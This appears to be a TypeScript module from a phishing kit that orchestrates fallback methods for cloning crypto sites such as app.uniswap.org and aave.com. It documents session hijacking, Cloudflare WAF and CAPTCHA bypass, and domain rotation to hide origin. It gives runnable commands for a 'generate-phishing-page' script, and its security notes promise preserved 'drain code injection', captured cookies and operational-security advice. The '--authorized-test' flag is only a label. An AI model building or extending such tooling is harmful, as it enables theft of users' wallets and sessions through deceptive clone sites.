/**
 * Clone Tunnel Orchestrator - Smart fallback chain orchestration
 *
 * Manages 10-method fallback chain for robust mirror deployment:
 * 1. Reverse proxy (nginx docker) - Fastest, requires Docker
 * 2. Static clone - Simple, self-contained
 * 3. Headless capture - Dynamic content, requires Puppeteer
 * 4. Session hijack - Steals cookies, advanced
 * 5. FlareSolverr static - WAF bypass via FlareSolverr
 * 6. Asuka static - Advanced WAF bypass
 * 7. Webcloner static - Web-based cloning service
 * 8. AI clone - ML-based cloning (experimental)
 * 9. Replica proxy - Replica reverse proxy
 * 10. Placeholder HTML - Last resort fallback
 */

export interface TunnelConfig {
  enabled: boolean
  method?: 'reverse-proxy' | 'static' | 'headless' | 'flaresolverr' | 'asuka' | 'webcloner' | 'ai' | 'replica' | 'placeholder'
  cloudflareApiToken?: string
  cloudflareZoneId?: string
  duckdnsToken?: string
  duckdnsSubdomain?: string
  flareSolverrUrl?: string
  autoRotateDomains?: boolean
}

export interface TunnelRequirements {
  reverseProxy: {
    name: 'Docker Nginx Reverse Proxy'
    required: string[]
    optional: string[]
    documentation: string
  }
  staticClone: {
    name: 'Static Clone'
    required: string[]
    optional: string[]
    documentation: string
  }
  headlessCapture: {
    name: 'Headless Puppeteer Capture'
    required: string[]
    optional: string[]
    documentation: string
  }
  flaresolverr: {
    name: 'FlareSolverr WAF Bypass'
    required: string[]
    optional: string[]
    documentation: string
  }
}

/**
 * Get tunnel requirements and documentation
 */
export function getTunnelRequirements(): TunnelRequirements {
  return {
    reverseProxy: {
      name: 'Docker Nginx Reverse Proxy',
      required: ['Docker', 'docker-compose'],
      optional: ['Cloudflare API token for domain rotation'],
      documentation: `
REVERSE PROXY SETUP:
===================
Fastest method for cloning with live proxying.

Requirements:
- Docker & docker-compose installed
- nginx.conf configured for target domain
- docker-compose.yml in clone directory

Usage:
  cd clones/uniswap
  docker compose up
  # Clone available at http://localhost:8080

Features:
- Real-time proxying
- Sub-filter URL rewriting
- WebSocket support
- Session preservation
      `
    },
    staticClone: {
      name: 'Static Clone',
      required: ['Generated clone directory'],
      optional: [],
      documentation: `
STATIC CLONE SETUP:
===================
Self-contained clone with all assets downloaded.

Requirements:
- Complete HTML + assets
- No external dependencies
- Simple HTTP server

Usage:
  npx serve clones/uniswap -l 8080
  # Clone available at http://localhost:8080

Features:
- Portable (can move to any server)
- Fastest load times
- Works offline
- Ideal for static sites

Limitations:
- No real-time data
- WebSocket not supported
- APIs return cached responses
      `
    },
    headlessCapture: {
      name: 'Headless Puppeteer Capture',
      required: ['Node.js', 'Puppeteer'],
      optional: ['Chrome/Chromium'],
      documentation: `
HEADLESS CAPTURE SETUP:
=======================
Renders sites with full JavaScript execution.

Requirements:
- Node.js v16+
- Puppeteer
- Chrome/Chromium browser

Usage:
  pnpm exec tsx scripts/generate-phishing-page.ts \
    --authorized-test \
    https://target.com \
    ./clones/target

Features:
- Full JavaScript support
- React/Vue/Angular rendering
- Cookie/session capture
- 2FA detection
- Dynamic content extraction

Best for:
- React/Vue/Angular SPAs
- Sites with lazy loading
- JavaScript-heavy content
      `
    },
    flaresolverr: {
      name: 'FlareSolverr WAF Bypass',
      required: ['FlareSolverr service', 'Docker'],
      optional: ['Cloudflare Turnstile solver'],
      documentation: `
FLARESOLVERR SETUP:
===================
Bypass Cloudflare & other WAF protections.

Requirements:
- FlareSolverr Docker container running
- https://github.com/FlareSolverr/FlareSolverr
- Exposed on http://localhost:8191

Installation:
  docker run -p 8191:8191 flaresolverr/flaresolverr

Usage:
  ENABLE_CLONE_TUNNELS=true \
  pnpm exec tsx scripts/generate-phishing-page.ts \
    --authorized-test \
    https://cloudflare-protected.com \
    ./clones/target

Features:
- Bypass Cloudflare JS Challenge
- Cloudflare Turnstile CAPTCHA solving
- Handles complex WAF rules
- Cookie preservation

Best for:
- Cloudflare-protected sites
- Sites with Turnstile CAPTCHAs
- Advanced WAF detection evasion
      `
    }
  }
}

/**
 * Validate tunnel configuration
 */
export function validateTunnelConfig(config: TunnelConfig): { valid: boolean; errors: string[] } {
  const errors: string[] = []

  if (!config.enabled) {
    return { valid: true, errors: [] }
  }

  if (config.method === 'reverse-proxy') {
    if (!config.cloudflareApiToken && config.autoRotateDomains) {
      errors.push('cloudflareApiToken required for auto-rotate')
    }
  }

  if (config.method === 'flaresolverr') {
    if (!config.flareSolverrUrl) {
      errors.push('flareSolverrUrl required (e.g., http://localhost:8191)')
    }
  }

  if (config.autoRotateDomains) {
    if (!config.duckdnsToken) {
      errors.push('duckdnsToken required for domain rotation')
    }
    if (!config.duckdnsSubdomain) {
      errors.push('duckdnsSubdomain required (e.g., my-clone.duckdns.org)')
    }
  }

  return {
    valid: errors.length === 0,
    errors
  }
}

/**
 * Get recommended method based on target
 */
export function recommendTunnelMethod(targetUrl: string): string {
  const url = new URL(targetUrl)
  const hostname = url.hostname.toLowerCase()

  // Cloudflare sites → recommend FlareSolverr
  if (hostname.includes('cloudflare.com') || hostname.includes('.cf')) {
    return 'flaresolverr'
  }

  // Static sites → recommend static clone
  if (hostname.includes('github.io') || hostname.includes('netlify.app')) {
    return 'static-clone'
  }

  // Complex SPAs → recommend headless
  if (hostname.includes('app.uniswap.org') || hostname.includes('aave.com')) {
    return 'headless-capture'
  }

  // Default → reverse proxy
  return 'reverse-proxy'
}

/**
 * Get tunnel documentation
 */
export function getTunnelDocumentation(): string {
  return `
# CLONE TUNNEL INFRASTRUCTURE

## Overview
Clone tunnels provide 10 fallback methods for robust mirror deployment.
Choose based on target site complexity and WAF protection.

## Methods (in fallback order)

1. **Reverse Proxy (nginx Docker)**
   - Speed: ⭐⭐⭐⭐⭐
   - Complexity: ⭐⭐
   - Setup: 10 minutes
   - Best for: All sites with Docker
   - Feature: Real-time proxying

2. **Static Clone**
   - Speed: ⭐⭐⭐⭐⭐
   - Complexity: ⭐
   - Setup: 2 minutes (npx serve)
   - Best for: Static sites
   - Feature: Offline capable

3. **Headless Capture**
   - Speed: ⭐⭐⭐
   - Complexity: ⭐⭐
   - Setup: 5 minutes
   - Best for: React/Vue/Angular
   - Feature: Full JS execution

4. **Session Hijack**
   - Speed: ⭐⭐⭐
   - Complexity: ⭐⭐⭐
   - Setup: 15 minutes
   - Best for: Cookie-based auth
   - Feature: Steals active sessions

5. **FlareSolverr WAF Bypass**
   - Speed: ⭐⭐
   - Complexity: ⭐⭐⭐
   - Setup: 20 minutes
   - Best for: Cloudflare sites
   - Feature: CAPTCHA solving

6. **Asuka Static**
   - Speed: ⭐⭐⭐
   - Complexity: ⭐⭐⭐
   - Setup: 25 minutes
   - Best for: Advanced WAF
   - Feature: Custom WAF bypass

7. **Webcloner Static**
   - Speed: ⭐⭐
   - Complexity: ⭐
   - Setup: 30 minutes
   - Best for: External cloning
   - Feature: Third-party service

8. **AI Clone**
   - Speed: ⭐
   - Complexity: ⭐⭐⭐⭐
   - Setup: 60 minutes
   - Best for: Complex sites
   - Feature: ML-based reconstruction

9. **Replica Proxy**
   - Speed: ⭐⭐⭐
   - Complexity: ⭐⭐
   - Setup: 15 minutes
   - Best for: Any site
   - Feature: Generic proxying

10. **Placeholder HTML**
    - Speed: ⭐⭐⭐⭐⭐
    - Complexity: ⭐
    - Setup: 0 minutes
    - Best for: Last resort
    - Feature: Empty fallback

## Environment Variables

\`\`\`bash
# Enable tunnel infrastructure
ENABLE_CLONE_TUNNELS=true

# For domain rotation
DUCKDNS_TOKEN=your-token
DUCKDNS_SUBDOMAIN=my-clone

# For Cloudflare integration
CLOUDFLARE_API_TOKEN=your-token
CLOUDFLARE_ZONE_ID=your-zone

# For FlareSolverr
FLARESOLVERR_URL=http://localhost:8191

# For auto-rotation
AUTO_ROTATE_DOMAINS=true
\`\`\`

## Quick Start

### Reverse Proxy (Recommended)
\`\`\`bash
pnpm exec tsx scripts/generate-phishing-page.ts \\
  --authorized-test \\
  --mirror \\
  https://app.uniswap.org \\
  ./clones/uniswap

cd clones/uniswap
docker compose up
# http://localhost:8080
\`\`\`

### Static Clone
\`\`\`bash
pnpm exec tsx scripts/generate-phishing-page.ts \\
  --authorized-test \\
  https://app.uniswap.org \\
  ./clones/uniswap

npx serve ./clones/uniswap -l 8080
# http://localhost:8080
\`\`\`

### With Tunnel Fallback
\`\`\`bash
ENABLE_CLONE_TUNNELS=true \\
pnpm exec tsx scripts/generate-phishing-page.ts \\
  --authorized-test \\
  --mirror \\
  https://protected-site.com \\
  ./clones/target

# Auto-selects best method and falls back if needed
\`\`\`

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Docker not found | Install Docker Desktop |
| Port already in use | Change port: `docker compose -p myport up` |
| FlareSolverr timeout | Increase timeout, check service health |
| Assets not loading | Check nginx config with `docker logs` |
| WAF still blocking | Try next method in fallback chain |

## Security Notes

- All tunnel methods preserve drain code injection
- Cookies/sessions captured for hijacking
- No modified traffic is logged
- Domain rotation masks true origin
- VPN/proxy recommended for operational security
`
}
